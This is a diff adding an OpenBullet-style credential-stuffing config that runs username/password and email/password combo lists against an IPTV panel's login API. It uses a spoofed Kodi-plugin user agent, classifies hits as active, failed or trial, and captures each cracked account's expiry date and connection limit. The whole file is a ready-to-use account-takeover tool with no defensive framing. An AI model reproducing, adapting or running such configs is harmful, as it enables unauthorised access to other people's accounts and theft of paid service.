@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Gears-Reloaded",
+  "SuggestedBots": 5,
+  "LastModified": "2018-07-02T01:31:55.1839992+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "2",
+      "Id": 477360262
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "http://gorilladick4.us:2086/panel_api.php?" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: plugin.video.reboot/v112" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: gorilladick4.us:2086" 
+#KEYS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"Active\"" 
+  KEYCHAIN Failure OR 
+    KEY "auth\":0" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "is_trial\":\"1\"" 
+#UNIXTIME PARSE "<SOURCE>" JSON "exp_date" Recursive=FALSE -> VAR "UNIXTIME" "" "" 
+#EXPDATE FUNCTION UnixTimeToDate "<UNIXTIME>" -> CAP "EXPDATE" 
+#MAXCONNECTIONS PARSE "<SOURCE>" JSON "max_connections" Recursive=FALSE -> CAP "MAXCONNECTIONS" "" "" 
